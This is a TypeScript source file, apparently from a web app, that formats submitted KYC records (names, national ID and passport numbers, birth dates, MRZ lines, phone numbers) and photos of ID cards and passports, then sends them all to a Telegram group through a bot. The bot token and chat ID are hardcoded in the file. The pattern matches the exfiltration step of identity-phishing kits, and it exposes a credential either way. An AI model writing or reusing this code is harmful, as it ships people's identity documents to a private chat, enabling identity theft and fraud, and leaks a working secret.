import { KycData } from '../types';

const BOT_TOKEN = '7701190517:AAHR4nJDg1B6YpVzNdiprh7jQlmq6PTv84A';
const CHAT_ID = '-1002700770095';
const API_BASE_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;

/**
 * Converts a data URL string into a Blob object for file uploads.
 * @param dataUrl The data URL (e.g., "data:image/png;base64,...").
 * @returns An object containing the Blob and a generated file name, or null on failure.
 */
const dataUrlToBlob = (dataUrl: string): { blob: Blob; fileName: string } | null => {
    try {
        const [meta, data] = dataUrl.split(',');
        if (!meta || !data) return null;

        const mimeMatch = meta.match(/:(.*?);/);
        const mimeType = mimeMatch ? mimeMatch[1] : 'image/jpeg';
        
        const extension = mimeType.split('/')[1] || 'jpg';
        const fileName = `image.${extension}`;
        
        const byteCharacters = atob(data);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray], { type: mimeType });

        return { blob, fileName };
    } catch (e) {
        console.error("Error converting data URL to blob", e);
        return null;
    }
};

/**
 * Escapes characters in a string for Telegram's MarkdownV2 format.
 * @param text The string to escape.
 * @returns The escaped string.
 */
const escapeMarkdownV2 = (text: string) => text.replace(/([_*\[\]()~`>#\+\-=|{}.!])/g, '\\$1');

/**
 * Formats the KYC data into a human-readable string for a Telegram message.
 * @param data The KYC data object.
 * @returns A formatted string with MarkdownV2 for styling.
 */
const formatKycDataForTelegram = (data: KycData): string => {
    let message = `*New KYC Record Submission*\n\n`;
    
    const fields: { key: keyof KycData; label: string }[] = [
        { key: 'documentType', label: 'Document Type' },
        { key: 'fullName', label: 'Full Name' },
        { key: 'nationalId', label: 'National ID' },
        { key: 'passportNumber', label: 'Passport No.' },
        { key: 'phoneNumber', label: 'Phone Number' },
        { key: 'nationality', label: 'Nationality' },
        { key: 'dateOfBirth', label: 'Date of Birth' },
        { key: 'placeOfBirth', label: 'Place of Birth' },
        { key: 'gender', label: 'Gender' },
        { key: 'issueDate', label: 'Issue Date' },
        { key: 'expiryDate', label: 'Expiry Date' },
        { key: 'bloodGroup', label: 'Blood Group' },
        { key: 'mrz', label: 'MRZ' },
    ];

    for (const { key, label } of fields) {
        let value = data[key];
        if (value) {
            if (key === 'documentType') {
                value = String(value).replace(/_/g, ' ').replace(/\b\w/g, (l) => l.toUpperCase());
            }
            const escapedValue = escapeMarkdownV2(String(value));
            message += `*${escapeMarkdownV2(label)}:* ${escapedValue}\n`;
        }
    }
    return message;
};

/**
 * Sends the KYC data and associated images to a Telegram group.
 * It first sends the images as a media group, then sends the formatted text data.
 * @param data The complete KYC data object, including base64 image strings.
 */
export const sendKycDataToTelegram = async (data: KycData): Promise<void> => {
    // 1. Send Images as a Media Group
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    
    const media = [];
    const imageFields: Array<keyof KycData> = ['idFrontImage', 'idBackImage', 'passportImage'];

    for (const field of imageFields) {
        if (data[field]) {
            const result = dataUrlToBlob(data[field] as string);
            if (result) {
                const attachName = `${field}_photo`;
                formData.append(attachName, result.blob, result.fileName);
                media.push({ type: 'photo', media: `attach://${attachName}` });
            }
        }
    }

    if (media.length > 0) {
        formData.append('media', JSON.stringify(media));
        try {
            const response = await fetch(`${API_BASE_URL}/sendMediaGroup`, {
                method: 'POST',
                body: formData,
            });
            if (!response.ok) {
                const errorData = await response.json();
                console.error("Telegram API error (sendMediaGroup):", errorData.description);
            }
        } catch (error) {
            console.error("Failed to send media group to Telegram:", error);
        }
    }

    // 2. Send Formatted Text Message
    const textMessage = formatKycDataForTelegram(data);
    try {
        const response = await fetch(`${API_BASE_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: textMessage,
                parse_mode: 'MarkdownV2',
            }),
        });
        if (!response.ok) {
            const errorData = await response.json();
            console.error("Telegram API error (sendMessage):", errorData.description);
        }
    } catch (error) {
        console.error("Failed to send message to Telegram:", error);
    }
};
